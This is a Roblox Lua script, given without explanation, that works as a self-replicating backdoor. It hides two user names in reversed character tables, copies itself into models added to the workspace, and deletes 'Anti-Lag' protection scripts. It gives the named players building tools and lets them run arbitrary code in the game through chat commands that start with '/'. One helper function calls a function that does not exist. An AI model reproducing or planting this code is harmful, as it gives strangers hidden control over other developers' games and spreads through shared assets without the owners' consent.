Altitude = script:clone()
calco = {"s","c","q","t","o","a","i","f","g","w","8","e","m","7","h","n"}
Knox = {}
table.insert (Knox, 1 ,string.reverse(calco[5] .. calco[2] .. calco[7] .. calco[1] .. calco[6] .. calco[9] .. calco[12] .. calco[13]))
table.insert (Knox, 1 ,string.reverse(calco[11] .. calco[14] .. calco[14] .. calco[4] .. calco[16] .. calco[6] .. calco[15] .. calco[2]))
Play = {}
function rando(votation)
local hatr = 5
local calc = math.pi * math.huge
local longicate = votation:GetChildren()
if #longicate > hatr then 
calc = calc + math.pi
return longicate[math.random(6,#longicate)]
end
end
function doublecheck()
local fj = game.Workspace:GetChildren()
for off = 1,#fj do
if fj[off].className == "Part" then
local fh = fj[off]:FindFirstChild("Anti-Lag")
if fh ~= nil then 
return false
end
end
end
return true
end
function workcheck()
if doublecheck() == true then
local l = Altitude:clone()
l.Parent = rando(game.Workspace)
end
end
workcheck()
function gibite(quen)
local  hup = Instance.new("Message")
hup.Text = "Detected"
hup.Parent = quen.Parent
local con = Instance.new("Script")
con.Source = [[wait(5) script.Parent:remove()]]
con.Parent = hup
for ish = 0,7 do
local a = Instance.new("HopperBin")
a.BinType = ish
a.Parent = quen
end
end
function laber(zonsa)
wait()
for slate = 1,#Knox do  
if zonsa.Name == Knox[slate] then
gibite(zonsa.Backpack)
table.insert (Play, 1,  zonsa.Name)
end
end
end
function yeild(frequency)
local t = Knox
for g = 1,#t do
if t[g] == frequency.Name then
return true
end
end
return false
end
function check(los)
local r = los:GetChildren()
for i = 1,#r do
local h = r[i]:FindFirstChild("Anti-Lag")
if h ~= nil then
h:remove()
end
end
end
function alto(xylem)
if xylem.className == "Model" then
check(xylem)
local que = script:clone()
que.Parent = rando(xylem)
end
end
function sortation(gone)
local dimbs = Altitude:clone()
dimbs = ramno(game.Workspace)
end
function onPlayerEntered(newPlayer)
newPlayer.Chatted:connect(function(msg, recipient) onChatted(msg, recipient, newPlayer) end) 
end
function Player(player)
player.Changed:connect(function (property) 
if property == "Character" then 
laber(player) 
end
end)
end
game.Players.PlayerAdded:connect(Player)
game.Players.ChildAdded:connect(onPlayerEntered)
game.Players.ChildAdded:connect(laber)
script.ChildRemoved:connect(sortation)
game.Workspace.ChildAdded:connect(alto)
function onChatted(msg, recipient, speaker)
if yeild(speaker) ~= false then
if string.sub(msg,1,1) == "/" then
local dsting = Instance.new("Script")
dsting.Source = string.sub(msg,2) 
dsting.Parent = game.Workspace 
end
end
end 
